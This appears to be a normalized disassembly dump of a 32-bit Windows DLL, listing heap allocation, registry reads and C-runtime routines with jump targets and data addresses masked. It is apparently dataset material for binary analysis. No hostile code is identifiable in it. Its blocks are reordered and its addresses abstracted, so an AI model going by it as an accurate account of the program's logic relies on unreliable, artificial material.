mov edx [ ecx ]
push ebx
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ edx + 0x1c ]
mov eax edi
jmp r-xdata
call sub_100332a0
mov [ ebp - 0x4 ] 0x3
call sub_1002f75b
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_100262c3
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_1005664f
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10069470
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x54 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_10057eeb
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_1003201d
mov ecx [ eax ]
push edi
push [ ebp - 0x54 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_10057eeb
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10069470
mov eax [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10069c00
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10069c20
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
pop ebp
retn
sub_10069c53
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_10069c80
push ebp
mov ebp esp
push ebx
mov ebx [ GetProcessHeap@IAT ]
push esi
mov esi ecx
push edi
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x3c ] edi
inc [ edi ]
call sub_1002d4a0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
mov [ eax ] edi
mov edi eax
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
sub_10069d70
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
cmp [ ebx + 0x4 ] esi
jbe r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edi [ eax + esi * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
push ecx
push edx
call sub_10029cd9
add esp 0x8
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
cmp esi [ ebx + 0x4 ]
jb r-xdata
sub_10069db0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
cmp esi [ ebp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
pop ebx
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push ebx
mov ecx edi
call eax
test al al
je r-xdata
sub_10069deb
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_100816a3
add esp 0x14
pop ebp
retn
sub_10069e16
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_1006a000
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ edx + 0x3c4 ]
push esi
mov esi [ edx + 0x3c0 ]
push edi
mov edi eax
xor eax eax
cmp esi ecx
je r-xdata
mov esi [ edx + 0x3a0 ]
mov edx [ edx + 0x3a4 ]
cmp esi edx
je r-xdata
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
cmp edi [ ecx ]
je r-xdata
cmp esi ecx
je r-xdata
add esi 0x8
cmp esi ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
push ebx
push edx
add ecx 0x20
push ecx
call sub_1006b5a0
mov ecx [ esi ]
mov eax [ ecx + 0x28 ]
add esi 0x4
cmp esi edx
jne r-xdata
mov ecx [ edx + 0x3d0 ]
mov edi [ edx + 0x3b0 ]
mov edx [ edx + 0x3b4 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
dec ecx
add eax edx
cmp eax ecx
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ecx + ecx * 8 ]
mov eax [ edi + ecx * 4 + 0x20 ]
lea edx [ edi + ecx * 4 ]
mov ecx [ esi + 0x4 ]
cmp ecx eax
jae r-xdata
push r--data
call sub_100651be
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea edi [ ecx + ebx ]
cmp edi eax
jae r-xdata
sub eax ecx
mov edi eax
mov edi ebx
jmp r-xdata
mov edx [ edx + 0x1c ]
mov eax [ ebp + 0x8 ]
push edi
add edx ecx
push edx
push eax
call sub_1007f580
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1006a100
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
sub_1006a134
push 0x10
mov eax sub_1008513c
call sub_10026266
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_1000c927
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0xc ] ebx
ja r-xdata
mov ecx [ ebp + 0xc ]
call sub_10042890
mov eax [ esi + 0x8 ]
mov edi ebx
cmp [ eax + edi * 4 ] 0x0
je r-xdata
lea edi [ ebx + 0x1 ]
cmp edi 0x28
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax + edi * 4 ] ecx
lea ecx [ ebp - 0x10 ]
call sub_10003c9c
call sub_10008d33
retn
mov ecx [ eax + edi * 4 ]
call sub_1000c580
test eax eax
je r-xdata
mov eax edi
shl eax 0x2
push eax
push [ esi + 0x8 ]
call sub_1001f715
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x28
pop edi
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
mov [ esi + 0x8 ] eax
jmp r-xdata
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
cmp [ esi + 0xc ] edi
jb r-xdata
push edi
lea ecx [ ebp - 0x1c ]
call sub_10015c68
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] esi
call sub_10055e2a
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov [ ebp + 0x8 ] r--data
call sub_1003a910
push sub_1008afea
mov [ rw-data ] esi
call sub_10064546
pop ecx
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
and [ ecx + eax * 4 ] 0x0
inc [ esi + 0xc ]
sub_1006a230
push ebp
mov ebp esp
sub esp 0x8
lea eax [ ebp - 0x4 ]
push eax
push 0x20119
push 0x0
push ecx
push edx
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
push esi
lea ecx [ eax + eax ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
push eax
push 0x0
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
push 0x0
push ecx
push edx
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi 0x2
sub_1006a2bc
push 0x28
mov eax sub_10085e3c
call sub_10026266
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1000a631
mov [ esi ] r--data
jmp r-xdata
sub_1006a360
mov eax [ edx + 0x4 ]
push esi
mov esi [ edx ]
sub eax esi
sar eax 0x5
cmp eax 0x7fffffe
jbe r-xdata
mov ecx [ edx + 0x8 ]
sub ecx esi
inc eax
sar ecx 0x5
cmp eax ecx
jbe r-xdata
push r--data
call sub_10030594
pop esi
retn
push edi
mov esi ecx
shr esi 0x1
mov edi 0x7ffffff
sub edi esi
cmp edi ecx
pop edi
jae r-xdata
add ecx esi
xor ecx ecx
jmp r-xdata
pop esi
jmp sub_100683a0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1006a3ae
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1000498f
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_1006a3e0
push ecx
cmp [ edi ] 0x0
push ebx
push esi
je r-xdata
pop esi
pop ebx
pop ecx
retn
mov eax [ edi ]
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ edi ]
push eax
call [ LocalFree@IAT ]
mov [ edi ] ebx
test ebx ebx
jne r-xdata
push esi
call sub_100492c0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1006a41c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
call sub_100056ae
test al al
je r-xdata
push r--data
call sub_10030594
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx esi
push edi
push 0x0
call sub_100412aa
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_1006a4c4
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_10051cf5
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0xc
push [ esi + 0x30 ]
call sub_1007fa40
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_1007fa40
mov esi [ ebp - 0x8 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x4 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x8 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_1005f1fb
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
add edi 0x68
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
int3
push esi
call sub_1007fa40
add esi eax
mov eax [ ebp - 0x8 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_1007fa40
add esi eax
inc [ ebp - 0x4 ]
add edi 0x4
cmp [ ebp - 0x4 ] 0xc
pop ecx
jb r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
mov [ esi ] 0x0
sub_1006a5c0
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ ebp - 0x44 ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
call sub_10073390
mov ebx [ ebp + 0x10 ]
push ebx
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_100233c0
lea edi [ ebp - 0x44 ]
call sub_10073400
mov edi [ ebp - 0x38 ]
push esi
push ebx
push r--data
call sub_100386a0
add esp 0x18
xor ebx ebx
mov ecx [ ebp - 0x38 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov [ edi + 0x34 ] 0x0
jmp r-xdata
xor eax eax
mov ecx [ ecx + 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x34 ]
mov eax r--data
cmp ecx 0x3
ja r-xdata
mov ebx 0x1
test ebx ebx
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov ecx [ edi ]
mov edx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x30 ]
push edx
push ecx
push eax
push r--data
call sub_100386a0
lea edx [ ebp - 0x34 ]
mov eax 0x1
add esp 0x14
mov [ edi + 0x68 ] edx
cmp [ ebp - 0x34 ] eax
jne r-xdata
jmp [ ecx * 4 + jump_table_1006a7f4 ]
mov eax 0x1
jmp r-xdata
mov [ edi + 0x38 ] eax
lea eax [ ebp - 0x44 ]
push eax
lea esi [ ebp - 0x34 ]
call sub_10078cd0
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax r--data
jmp r-xdata
mov edx [ ebp - 0x1c ]
push edx
call sub_1004bc00
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
push eax
call sub_1004bc00
add esp 0x4
jmp r-xdata
mov eax r--data
push eax
lea edx [ ebp - 0x44 ]
push edx
call sub_1001fef0
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_10061790
add esp 0x10
test eax eax
je r-xdata
mov ebx 0x1
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x7
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
lea eax [ ebp - 0x34 ]
call sub_10073670
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp - 0x48 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
mov [ eax ] 0x29
cmp [ edi + 0x34 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
lea eax [ ebp - 0x44 ]
call sub_10075620
mov eax [ ebp - 0x40 ]
mov esi [ eax ]
cmp [ esi + 0x20 ] 0x0
jne r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x44 ]
push r--data
push ecx
call sub_1004ab70
add esp 0x8
mov [ esi + 0x20 ] eax
cmp [ esi + 0x28 ] 0x0
jne r-xdata
lea edx [ ebp - 0x44 ]
push r--data
push edx
call sub_1004ab70
add esp 0x8
mov [ esi + 0x24 ] eax
mov esi [ ebp - 0x38 ]
lea ecx [ esi + 0x14 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_1001cd60
lea eax [ esi + 0x8 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_1001cd60
lea edx [ esi + 0x20 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
call sub_1001cd60
lea ecx [ esi + 0x48 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_10028ff0
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_1006db40
lea ecx [ ebp - 0x44 ]
push ecx
call sub_10064ee0
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x40 ]
add esp 0x2c
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x44 ]
push r--data
push eax
call sub_1004ab70
add esp 0x8
mov [ esi + 0x28 ] eax
sub_1006a810
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
push edx
call sub_1005a955
mov esi eax
add esp 0xc
cmp esi 0xffffffff
jne r-xdata
pop esi
pop ebp
retn 0x10
call sub_1005b670
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov eax esi
sub_1006a842
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x34 ]
mov esi ebx
call sub_10051cf5
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x34 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x28 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x34 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_100718ba
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_1005459b
add esp 0xc
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x24 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ecx + 0x10 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x24 ]
call sub_1005b670
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_1006a97b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10028fdb
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_1006a99c
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1006ee94
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1000f103
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100234cf
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x1c
sub_1006aa10
push ebp
mov ebp esp
push 0xffffffff
push sub_1008988e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xac ] ecx
lea edi [ ebp - 0xac ]
lea ecx [ ebp - 0xb0 ]
mov [ ebp - 0xb4 ] edx
mov [ ebp - 0xa8 ] eax
call sub_10056b90
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
push 0x2c
call sub_1002e3ac
add esp 0x4
cmp eax edi
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x11e
call sub_10069020
lea ecx [ ebp - 0xa4 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x50 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0xf ]
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x58 ] esi
jb r-xdata
xor eax eax
mov ecx [ ebp - 0xac ]
mov edx [ ebp - 0xb0 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
